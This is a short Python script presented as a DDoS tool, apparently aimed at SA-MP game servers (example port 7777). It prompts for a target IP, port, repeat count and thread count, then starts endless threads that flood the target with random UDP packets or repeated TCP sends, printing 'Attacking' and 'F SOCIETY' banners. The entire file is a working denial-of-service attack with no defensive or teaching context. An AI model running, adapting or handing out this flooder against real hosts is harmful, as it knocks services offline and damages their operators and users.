import random
import socket
import threading
import platform

print("DDoS is Running in : "+platform.system())

if platform.system() == 'Windows':

	print ("\033[35m                      ╔════════════════════════════════════╗")
	print ("\033[35m                      ║\033[31m  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗\033[35m  ║")
	print ("\033[35m                      ║\033[31m  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║ \033[35m  ║")
	print ("\033[35m                      ║\033[31m  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝ ╩ \033[35m  ║")
	print ("\033[35m                      ╚════════════════════════════════════╝")
else :
	print("""
DDOS SaMp


██ ╬╬ ╬╬ ██ ███ ██ █ ██ ███ █╬█
█▄ ╬╬ ╬╬ █▄ █╬█ █╬ █ █▄ ╬█╬ █▄█
█╬ ╬╬ ╬╬ ▄█ █▄█ ██ █ █▄ ╬█╬ ╬█╬
		""")


print("DDos")
ip= str(input("                   Ip = "))
port= int(input("                   Port ex:7777 = "))
choice = str(input("                  continue ? yes = y / no = n :"))
times= int(input("                   how many times:"))
threads= int(input("                   threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"F SOCIETY")
		except:
			print("Attacking")

def run2():
	data = random._urandom(16)
	i = "[+] "
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +"Attacking")
		except:
			s.close()
			print("Down !")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
